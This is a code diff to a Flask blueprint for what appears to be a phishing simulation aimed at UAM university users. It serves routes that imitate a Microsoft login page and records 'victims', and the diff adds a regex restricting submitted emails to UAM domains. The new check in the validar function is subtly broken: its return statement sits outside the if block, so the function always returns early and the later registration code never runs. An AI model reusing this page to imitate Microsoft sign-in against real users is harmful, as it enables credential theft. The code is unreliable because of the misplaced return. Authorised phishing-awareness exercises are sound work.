@@ -3,6 +3,10 @@ import secrets
 from flask import Blueprint, render_template, session, abort, request, redirect, url_for
 from rutas_qrs import MAPEO_TRACKING
 from redis_db import detector_de_fases, registrar_victima, convertir_email_hash, limiter
+import re
+
+# Para evitar que alguien se le ocurra usar un correo que no sea de la UAM para probar el sistema,
+PATRON_CORREO_UAM = re.compile(r'^[a-zA-Z0-9_.+-]+@(estudiante\.uam\.es|uam\.es)$')
 
 phishing_bp = Blueprint('phishing', __name__)
 
@@ -52,6 +56,15 @@ def ms_login():
 @phishing_bp.route('/login.microsoftonline.com/fc6602ef-8e88-4f1d-a206-e14a3bc19af2/saml3', methods=['POST'])
 def ms_password():
     correo = request.form.get('email')
+
+    # Validamos que el correo sea del dominio UAM antes de continuar
+    if not correo or not PATRON_CORREO_UAM.match(correo):
+        logging.warning(
+            "VALIDACION FALLIDA EN PASO EMAIL: correo fuera del dominio UAM",
+            extra={"ip": request.remote_addr, "event_type": "invalid_email_domain"}
+        )
+        return render_template('ms_email_error.html')
+
     session['email'] = correo
     
     token_csrf = secrets.token_hex(16) 
@@ -90,6 +103,14 @@ def validar():
         
     session.pop('csrf_token', None)
     identificador = email if email else username
+
+    # Para evitar que alguien use un correo que no sea de la UAM, validamos el dominio del correo
+    if not identificador or not PATRON_CORREO_UAM.match(identificador):
+        logging.warning(
+            "VALIDACION FALLIDA: correo fuera del dominio UAM o vacío",
+            extra={"ip": request.remote_addr, "event_type": "invalid_email_domain"}
+        )
+    return render_template('index.html', csrf_token=secrets.token_hex(16))
     
     if identificador:
         identificador_hash = convertir_email_hash(identificador)
